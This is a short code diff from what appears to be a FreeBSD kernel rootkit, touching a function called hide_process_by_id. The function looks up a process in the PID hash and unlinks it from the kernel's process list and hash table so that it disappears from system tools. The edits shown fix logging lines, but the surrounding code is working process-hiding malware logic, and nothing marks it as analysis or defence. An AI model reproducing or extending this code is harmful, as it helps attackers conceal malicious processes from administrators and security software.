@@ -116,7 +116,7 @@ void hide_process_by_id(pid_t id){
 	/* Two options. Iterate over pidhashtabl, or allproc_list. 
 	*  Better performance over pidhashtabl */
 	LIST_FOREACH(p, PIDHASH(id), p_list){
-		LOGI("Checking PID:%d\n", p->pid)
+		LOGI("Checking PID:%d\n", p->p_pid);
 		if(p->p_pid == id)
 		{
 			/* A process is either NEW, NORMAL, ZOMBIE 
@@ -126,7 +126,7 @@ void hide_process_by_id(pid_t id){
 				p = NULL;
 				break;
 			}
-			LOGI("Found PID, Removing from p_list, p_hash\n")
+			LOGI("Found PID, Removing from p_list, p_hash\n");
 			PROC_LOCK(p);
 
 			LIST_REMOVE(p, p_list);
